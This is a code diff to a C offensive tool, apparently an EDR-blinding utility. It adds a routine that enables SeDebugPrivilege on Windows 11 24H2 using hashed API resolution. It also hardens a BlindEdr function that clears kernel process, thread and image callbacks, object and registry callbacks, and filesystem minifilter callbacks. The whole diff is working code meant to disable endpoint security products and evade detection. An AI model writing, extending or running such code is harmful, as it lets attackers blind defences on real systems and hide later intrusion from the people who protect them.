@@ -4,6 +4,8 @@
 
 #include <stdio.h>
 
+
+
 char* ci_strstr(const char* str1, const char* str2) {
 	// Handle empty pattern string case
 	if (!*str2) return (char*)str1;
@@ -174,9 +176,18 @@ BOOL restoreBlindness() {
 
 BOOL BlindEdr() {
 
+	// If it is Windows 11 24H2 version, 
+	// SedebugPrivilege must be enabled to obtain the kernel's imagebase address
+	if (!EnablePrivilegeH()) {
+		PRINT("Failed to handle privileges\n");
+		return FALSE;
+	}
+
 	static INT64 FltEnumerateFiltersAddr = 0;
+
 	// Initialize filter manager
 	FltEnumerateFiltersAddr = GetFuncAddressH(FLTMGRSYS_CH,  FltEnumerateFilters_CH);
+	
 	if (!FltEnumerateFiltersAddr) {
 		PRINT("Failed to get FltEnumerateFilters address\n");
 		return FALSE;
@@ -186,10 +197,17 @@ BOOL BlindEdr() {
 
 	// Clear system callbacks
 	BOOL success = TRUE;
-	success &= ClearThreeCallBack();
-	success &= ClearObRegisterCallbacks();
-	success &= ClearCmRegistercallback();
-	success &= ClearMiniFilterCallBack(FltEnumerateFiltersAddr);
+
+	__try {
+		ClearThreeCallBack();
+		ClearObRegisterCallbacks();
+		ClearCmRegistercallback();
+		ClearMiniFilterCallBack(FltEnumerateFiltersAddr);
+	}
+	__except (EXCEPTION_EXECUTE_HANDLER) {
+		PRINT("× Cleanup failed with exception: 0x%08x\n", GetExceptionCode());
+		success = FALSE;
+	}
 
 	if (!success) {
 		PRINT("Warning: Some callbacks could not be cleared\n");
@@ -315,7 +333,7 @@ PVOID GetModuleBaseH(IN UINT32 NAME_HASH)
 
 				if (NAME_HASH == CHASH(moduleName)) {
 					result = ModuleInfo->Modules[i].ImageBase;
-
+					PRINT("Module: %s, Base Address: 0x%llx\n", moduleName, (UINT64)result);
 					// Update cache
 					lastHash = NAME_HASH;
 					lastBase = result;
@@ -332,12 +350,106 @@ PVOID GetModuleBaseH(IN UINT32 NAME_HASH)
 	return result;
 }
 
+BOOL EnablePrivilegeH()
+{
+	HANDLE hToken = NULL;
+	TOKEN_PRIVILEGES tp = { 0 };
+	LUID luid = { 0 };
+	BOOL bResult = FALSE;
+
+	// Only enable privilege elevation for Windows 11 24H2 (Build 26100)
+	DWORD buildNumber = GetNtBuild();
+	if (buildNumber != 26100) {
+		PRINT("Current build number: %d, privilege elevation not required\n", buildNumber);
+		return TRUE;
+	}
+
+	// Get required API functions from advapi32.dll
+	HMODULE hAdvapi32 = GetModuleHandleH(advapi32dll_CH, FALSE);
+	if (!hAdvapi32) {
+		PRINT("Failed to get advapi32.dll handle\n");
+		return FALSE;
+	}
+
+	// Resolve function addresses using API hashing
+	fnOpenProcessToken pOpenProcessToken = 
+		(fnOpenProcessToken)GetProcAddressH(hAdvapi32, OpenProcessToken_CH);
+	fnLookupPrivilegeValueA pLookupPrivilegeValue = 
+		(fnLookupPrivilegeValueA)GetProcAddressH(hAdvapi32, LookupPrivilegeValueA_CH);
+	fnAdjustTokenPrivileges pAdjustTokenPrivileges = 
+		(fnAdjustTokenPrivileges)GetProcAddressH(hAdvapi32, AdjustTokenPrivileges_CH);
+
+	if (!pOpenProcessToken || !pLookupPrivilegeValue || !pAdjustTokenPrivileges) {
+		PRINT("Failed to get required function addresses\n");
+		return FALSE;
+	}
+
+	__try {
+		// Open process token with required access rights
+		if (!pOpenProcessToken(GetCurrentProcess(), 
+			TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, 
+			&hToken)) 
+		{
+			PRINT("OpenProcessToken failed with %d\n", GetLastError());
+			__leave;
+		}
+
+		// Use the complete privilege name
+		const char* privName = "SeDebugPrivilege";  // Full privilege name
+		
+		// Get LUID for SeDebugPrivilege
+		if (!pLookupPrivilegeValue(NULL, privName, &luid)) 
+		{
+			PRINT("LookupPrivilegeValue failed with %d\n", GetLastError());
+			__leave;
+		}
+
+		// Setup privilege array
+		tp.PrivilegeCount = 1;
+		tp.Privileges[0].Luid = luid;
+		tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
+
+		// Adjust token privileges to enable SeDebugPrivilege
+		if (!pAdjustTokenPrivileges(hToken, 
+			FALSE,              
+			&tp,               
+			sizeof(TOKEN_PRIVILEGES), 
+			NULL,              
+			NULL))
+		{
+			PRINT("AdjustTokenPrivileges failed with %d\n", GetLastError());
+			__leave;
+		}
+
+		// Check if the privilege was actually assigned
+		if (GetLastError() == ERROR_NOT_ALL_ASSIGNED) {
+			PRINT("The token does not have the specified privilege\n");
+			__leave;
+		}
+
+		bResult = TRUE;
+		PRINT("Successfully enabled SeDebugPrivilege\n");
+	}
+	__except(EXCEPTION_EXECUTE_HANDLER) {
+		PRINT("Exception occurred while enabling privilege: 0x%08x\n", GetExceptionCode());
+		bResult = FALSE;
+	}
+
+	// Cleanup
+	if (hToken) {
+		CloseHandle(hToken);
+	}
+
+	return bResult;
+}
+
 
 UINT64 GetFuncAddressH(IN UINT32 ModuleNameHash, IN UINT32 FuncNameHash)
 {
     // Get kernel module base
     PVOID KBase = GetModuleBaseH(ModuleNameHash);
     if (!KBase) {
+		PRINT("Can't get the ModuleBase!\n");
         return 0;
     }
 
@@ -471,3 +583,4 @@ UINT64 FindPattern(UINT64 startAddress, const PATTERN_SEARCH* pattern, int maxCo
 	free(buffer);
 	return 0;
 }
+
